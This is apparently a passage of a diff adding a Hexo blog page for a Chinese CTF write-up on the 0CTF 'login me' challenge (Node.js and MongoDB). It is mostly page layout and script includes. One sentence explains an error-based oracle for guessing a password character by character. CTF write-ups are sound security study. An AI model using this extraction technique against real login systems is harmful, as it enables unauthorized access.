+<p><em>若前面猜测的password(123)小于等于正确的password，那么将return 1<br>此时程序正常，反之，则return a，因不存在这个定义的a，那么将会抛出错误</em></p>
+
+        
+      </div>
+      
+      
+      
+    </div>
+    
+
+
+  
+  
+  <ul class="breadcrumb">
+    
+      
+      
+        
+          <li><a href="/user-5035860-1543717448/">USER-5035860-1543717448</a></li>
+          
+            
+          
+        
+      
+    
+      
+      
+        
+          <li>CTF记录</li>
+        
+      
+    
+      
+      
+        
+          <li><a href="/user-5035860-1543717448/复现0ctf-login-me(nodejs+mongodb).html/">复现0CTF-LOGIN-ME(NODEJS+MONGODB).HTML</a></li>
+          
+            
+          
+        
+      
+    
+  </ul>
+
+
+    
+    
+    
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">cws6</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">3</span>
+                    <span class="site-state-item-name">posts</span>
+                  </a>
+                </div>
+              
+
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">3</span>
+                    <span class="site-state-item-name">tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">cws6</span>
+
+  
+
+  
+</div>
+
+<div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+  本站访客数:<span id="busuanzi_value_site_uv"></span>
+</span>
+</div>
+
+<!-- 
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.8.0</div>
+
+-->
+
+
+  <span class="post-meta-divider">|</span>
+
+
+<!-- 
+  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v6.6.0</div>
+
+-->
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+      
+  
+  <script type="text/javascript" color="0,0,255" opacity="0.5" zindex="-1" count="99" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.6.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.6.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.6.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.6.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.6.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+</body>
+</html>
